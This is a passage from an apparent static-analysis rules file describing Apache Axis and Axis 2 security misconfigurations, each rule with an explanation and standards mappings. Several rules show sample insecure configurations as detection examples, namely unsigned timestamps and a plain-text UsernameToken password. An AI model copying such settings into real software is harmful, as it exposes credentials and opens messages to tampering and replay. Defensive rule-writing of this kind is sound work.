																									   <p>[8] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[9] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[14]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_requester_misconfiguration_outbound_ws_security_not_enabled
		</key>
		<internalKey>Environment/Axis 2 Service Requester
			Misconfiguration/Outbound WS-Security Not Enabled
		</internalKey>
		<name>Axis 2 Service Requester Misconfiguration: Outbound WS-Security
			Not Enabled
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Service providers that don't use WS-Security make it hard to guarantee message integrity or confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  WS-Security is an extension of SOAP that provides end-to-end message integrity and confidentiality regardless of the transport protocol. When WS-Security is not used, messages rely on transport security for integrity and confidentiality. If a service relays messages to other services, messages are exposed to the weakest transport mechanism used between relay points. WS-Security eliminates the transport security dependency and builds security into the message itself.<br><br> The absence of an <code>OutflowSecurity</code> parameter in the Apache Axis 2 configuration file indicates that outbound message security is not enabled.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_requester_misconfiguration_plain_text_password
		</key>
		<internalKey>Environment/Axis 2 Service Requester
			Misconfiguration/Plain Text Password
		</internalKey>
		<name>Axis 2 Service Requester Misconfiguration: Plain Text Password
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Avoid the WS-Security password type <code>PasswordText</code>.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Using a password type of <code>PasswordText</code> might be an indication that actual passwords are being transmitted in plain text. The WS-Security UsernameToken Profile states that text sent in the UsernameToken <code>&lt;Password&gt;</code> tag is not limited to actual passwords, but can contain password derivatives instead. However, it is common for developers to send actual passwords instead of password derivatives. Sending unencrypted passwords or even password hashes exposes the credentials to anyone with a traffic sniffer.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 522</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10, Requirement 8.4</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[19]  <em>Web Services Security Username Token Profile 1.0</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_requester_misconfiguration_unsigned_inbound_timestamp
		</key>
		<internalKey>Environment/Axis 2 Service Requester
			Misconfiguration/Unsigned Inbound Timestamp
		</internalKey>
		<name>Axis 2 Service Requester Misconfiguration: Unsigned Inbound
			Timestamp
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An unsigned timestamp can leave a SOAP message open to tampering and replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates a message's freshness. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, an attacker can intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>The following client configuration tells Axis 2 to accept unsigned timestamps:<br><pre><br>&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;<br>...<br>	&lt;parameter name=&quot;InflowSecurity&quot;&gt;<br>		&lt;action&gt;<br>			&lt;items&gt;Timestamp Encrypt&lt;/items&gt;<br>			...<br>		&lt;/action&gt;<br>	&lt;/parameter&gt;<br>&lt;/axisconfig&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>
																									   <p>[16]  <em>Web Services Security: SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_requester_misconfiguration_unsigned_outbound_timestamp
		</key>
		<internalKey>Environment/Axis 2 Service Requester
			Misconfiguration/Unsigned Outbound Timestamp
		</internalKey>
		<name>Axis 2 Service Requester Misconfiguration: Unsigned Outbound
			Timestamp
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An unsigned timestamp can leave a SOAP message open to tampering and replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates a message's freshness. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, an attacker can intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>The following client configuration tells Axis 2 to send unsigned timestamps:<br><pre><br>&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;<br>...<br>	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;<br>		&lt;action&gt;<br>			&lt;items&gt;Timestamp Encrypt&lt;/items&gt;<br>			...<br>		&lt;/action&gt;<br>	&lt;/parameter&gt;<br>&lt;/axisconfig&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>
																									   <p>[16]  <em>Web Services Security: SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_requester_misconfiguration_ws_security_not_enabled
		</key>
		<internalKey>Environment/Axis 2 Service Requester
			Misconfiguration/WS-Security Not Enabled
		</internalKey>
		<name>Axis 2 Service Requester Misconfiguration: WS-Security Not
			Enabled
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Turning off WS-Security makes it hard to guarantee message integrity and confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The Rampart WS-Security module is not enabled. WS-Security is an extension of SOAP that provides end-to-end message integrity and confidentiality regardless of the transport protocol. When WS-Security is not used, message rely on transport security for integrity and confidentiality. If a service relays messages to other services, messages are exposed to the weakest transport mechanism used between relay points. WS-Security removes the transport security dependency and builds security into the message itself.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_2_service_requester_misconfiguration_weak_token
		</key>
		<internalKey>Environment/Axis 2 Service Requester
			Misconfiguration/Weak Token
		</internalKey>
		<name>Axis 2 Service Requester Misconfiguration: Weak Token</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using a UsernameToken with a plain text password over an unencrypted channel exposes the password to attackers who can sniff the SOAP messages.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Sending cleartext passwords over an unencrypted channel can expose the credential to attackers who can sniff the SOAP message.<br><br>The following Axis 2 client configuration uses UsernameToken (a password):<br><pre><br>&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;<br>...<br>    &lt;parameter name=&quot;OutflowSecurity&quot;&gt;<br>      &lt;action&gt;<br>        &lt;items&gt;UsernameToken&lt;/items&gt;<br>        &lt;user&gt;bob&lt;/user&gt;<br>        &lt;passwordCallbackClass&gt;org.apache.rampart.samples.PWCBHandler&lt;/passwordCallbackClass&gt;<br>        &lt;passwordType&gt;PasswordText&lt;/passwordType&gt;<br>      &lt;/action&gt;<br>    &lt;/parameter&gt;<br>...<br>&lt;/axisconfig&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[21]  <em>Securing SOAP Messages with Rampart</em> Apache Software Foundation<br></p>
																									   <p>[22]  <em>Web Services Security Username Token Profile 1.0</em> OASIS<br></p>
																									   <p>[23]  <em>Web Services Security: SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_misconfiguration_debug_information</key>
		<internalKey>Environment/Axis Misconfiguration/Debug Information
		</internalKey>
		<name>Axis Misconfiguration: Debug Information</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Debugging information helps attackers learn about the system and plan a form of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When <code>axis.development.system</code> is set to <code>true</code> in the server configuration file, the system behaves as if it is a development environment. It sends stack traces in SOAP responses that can leak information about the system or application.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[10]  <em>Axis Reference Guide</em> Apache Software Foundation<br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 215</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_axis_misconfiguration_service_enumeration</key>
		<internalKey>Environment/Axis Misconfiguration/Service Enumeration
		</internalKey>
		<name>Axis Misconfiguration: Service Enumeration</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Publicly exposing information about a service can provide attackers with valuable insight into how they might exploit the service.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When <code>axis.disableServiceList</code> is set to <code>false</code>, Apache Axis will return a list of available services when a GET is performed on a servlet root. The service list may contain a list of features that show not be publicly accessible.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
